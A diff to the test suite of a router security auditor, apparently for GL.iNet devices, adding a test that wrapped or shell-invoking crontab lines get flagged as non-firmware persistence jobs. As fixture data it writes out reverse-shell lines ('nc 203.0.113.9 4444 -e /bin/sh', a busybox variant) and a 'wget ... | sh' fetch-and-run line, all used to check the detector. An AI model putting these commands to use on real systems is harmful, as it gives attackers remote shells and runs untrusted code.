@@ -891,6 +891,53 @@ class TestAuditGLiNet(AuditCase):
         finally:
             self.sh("rm -rf /etc/oui; [ -f /etc/glversion ] || mv /etc/glversion.off /etc/glversion")
 
+    def test_wrapped_programs_are_not_firmware_jobs(self):
+        # a line that runs a program through a wrapper, a shell or command substitution, or
+        # gives a network tool a shell, hides what it runs: never a firmware job
+        wrapped = {
+            '* * * * * sh -c "evilprog --daemon"': ("LOW", "runs another program through sh"),
+            "* * * * * nice evilprog": ("LOW", "runs another program through nice"),
+            "* * * * * xargs -n1 /usr/bin/evilprog </etc/hosts": ("LOW", "runs another program through xargs"),
+            "* * * * * eval $(cat /etc/x)": ("LOW", "command substitution; what it runs was not judged; runs another "
+                                                    "program through eval"),
+            "* * * * * /usr/bin/auto_timezone `cat /etc/x`": ("LOW", "command substitution; what it runs was not judged"),
+            "* * * * * exec /usr/bin/auto_timezone": ("LOW", "runs another program through exec"),
+            "* * * * * find /tmp -name x -exec evilprog {} +": ("LOW", "runs another program through find"),
+            "* * * * * nc 203.0.113.9 4444 -e /bin/sh": ("MEDIUM", "nc with a program to run"),
+            "* * * * * busybox nc 203.0.113.9 4444 -e /bin/sh": ("MEDIUM", "runs another program through busybox"),
+        }
+        self.sh("printf '#!/bin/sh\\nid\\n' > /usr/bin/evilprog && chmod 755 /usr/bin/evilprog")
+        try:
+            # one line each, then all together
+            lines = list(wrapped)
+            for line in (lines[0], lines[-1]):
+                self.container.put("/tmp/gl_crontabs/root", f"* * * * * /usr/bin/auto_timezone\n{line}\n".encode())
+                _, found = self.audit(self.ENV, categories=["persistence"])
+                sev, reason = wrapped[line]
+                self.assertFinding(found, "persistence.live_crontab", sev, f"line 2: {line}  <- ", reason)
+                self.assertNotIn(line, found["persistence.live_crontab_firmware"][1])
+            self.container.put("/tmp/gl_crontabs/root",
+                               ("* * * * * /usr/bin/auto_timezone\n" + "\n".join(lines) + "\n").encode())
+            _, found = self.audit(self.ENV, categories=["persistence"])
+            self.assertFinding(found, "persistence.live_crontab", "MEDIUM")
+            ev = found["persistence.live_crontab"][1].splitlines()
+            for n, line in enumerate(lines, start=2):
+                hit = [e for e in ev if f"/tmp/gl_crontabs/root line {n}: {line}  <- " in e]
+                self.assertEqual(len(hit), 1, line)
+                self.assertIn(wrapped[line][1], hit[0], line)
+            self.assertIn("nc with a program to run (-e, -c, exec:): a network tool that hands a shell",
+                          found["persistence.live_crontab"][1])
+            firmware = found["persistence.live_crontab_firmware"][1]
+            self.assertEqual(firmware.count("    - "), 1, firmware)
+            self.assertIn("line 1: * * * * * /usr/bin/auto_timezone\n", firmware)
+            # the stock GL.iNet lines stay firmware jobs
+            self.sh(self.STOCK_CRON)
+            _, found = self.audit(self.ENV, categories=["persistence"])
+            self.assertNotIn("persistence.live_crontab", found)
+            self.assertEqual(found["persistence.live_crontab_firmware"][1].count("    - "), 3)
+        finally:
+            self.sh(self.STOCK_CRON + "; rm -f /usr/bin/evilprog")
+
     def test_live_crontab_lines(self):
         self.sh("printf '#!/bin/sh\\nid\\n' > /usr/bin/gl-extra && chmod 755 /usr/bin/gl-extra && "
                 "echo '0 2 * * * /usr/bin/gl-extra' >> /tmp/gl_crontabs/root")
@@ -913,7 +960,8 @@ echo '0 5 * * * /usr/bin/update-check' > /etc/crontabs/root""")
             self.assertFinding(found, "persistence.live_crontab", "MEDIUM",
                                "line 5: */5 * * * * /tmp/.x/run  <- /tmp/.x/run: /tmp/.x/run is on the RAM disk and "
                                "does not exist now",
-                               "line 6: 0 * * * * wget -qO- http://203.0.113.9/p | sh  <- downloads or pipes into a shell",
+                               "line 6: 0 * * * * wget -qO- http://203.0.113.9/p | sh  <- runs another program through sh; "
+                               "the program it runs was not judged; downloads or pipes into a shell",
                                "line 7: 0 1 * * * notthere --flag >/dev/null 2>&1  <- notthere: not found in /usr/sbin",
                                "line 8: 0 3 * * * /usr/bin/gl-extra --password=<redacted>  <- /usr/bin/gl-extra: not in")
             self.assertNotIn("cronsecret44", text)
